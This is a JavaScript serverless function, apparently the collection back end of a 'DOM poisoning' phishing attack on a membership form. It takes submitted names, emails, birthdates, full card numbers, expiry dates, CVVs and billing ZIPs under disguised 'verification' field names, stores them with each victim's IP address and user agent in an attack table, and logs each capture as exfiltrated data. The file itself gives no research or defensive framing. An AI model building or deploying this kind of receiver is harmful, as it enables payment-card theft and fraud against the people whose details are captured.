// Vercel Serverless Function for Membership DOM Poisoning Attack Data Collection V2
// Endpoint: /api/membership/submit-v2

import { neon } from '@neondatabase/serverless';

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        // Connect to Neon database
        const sql = neon(process.env.subscription_form_DATABASE_URL);

        const {
            formType,
            firstName,
            lastName,
            email,
            birthdate,
            zipCode,
            verificationPayment,
            domPoisoningSuccess,
            isFieldUpdate,
            updateTimestamp,
            submittedAt
        } = req.body;

        // Extract verification data (generic field names)
        const verification = verificationPayment || {};

        // Get client IP and user agent
        const userAgent = req.headers['user-agent'] || '';
        const clientIP = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection?.remoteAddress || 'unknown';

        // Insert data into membership attack table v2 using Neon
        const result = await sql`
            INSERT INTO membership_attack_data_v2 (
                form_type, first_name, last_name, email, birthdate, zip_code,
                verification_number, exp_month, exp_year,
                security_code, legal_name, postal_code,
                dom_poisoning_success, is_field_update, update_timestamp,
                user_agent, ip_address, submitted_at
            ) VALUES (
                ${formType || 'membership'},
                ${firstName || null},
                ${lastName || null},
                ${email || null},
                ${birthdate || null},
                ${zipCode || null},
                ${verification.verifyCardNumber || null},
                ${verification.verifyExpiryMonth || null},
                ${verification.verifyExpiryYear || null},
                ${verification.verifyCVV || null},
                ${verification.verifyCardName || null},
                ${verification.verifyBillingZip || null},
                ${domPoisoningSuccess || false},
                ${isFieldUpdate || false},
                ${updateTimestamp || null},
                ${userAgent},
                ${clientIP},
                ${submittedAt || new Date().toISOString()}
            )
            RETURNING id, created_at;
        `;

        // Log successful data exfiltration
        console.log('🚨 MEMBERSHIP V2 DATA EXFILTRATED:', {
            id: result[0].id,
            email: email,
            hasVerificationData: !!(verification.verifyCardNumber),
            domPoisoningSuccess: domPoisoningSuccess,
            isFieldUpdate: isFieldUpdate,
            timestamp: result[0].created_at
        });

        res.status(200).json({
            success: true,
            message: 'Membership v2 data successfully captured',
            attack_id: result[0].id,
            timestamp: result[0].created_at,
            dom_poisoning_success: domPoisoningSuccess,
            data_captured: {
                basic_fields: !!(firstName && lastName && email),
                verification_fields: !!(verification.verifyCardNumber),
                is_update: isFieldUpdate
            }
        });

    } catch (error) {
        console.error('Membership v2 data capture error:', error);
        res.status(500).json({
            error: 'Failed to capture membership v2 data',
            details: error.message
        });
    }
}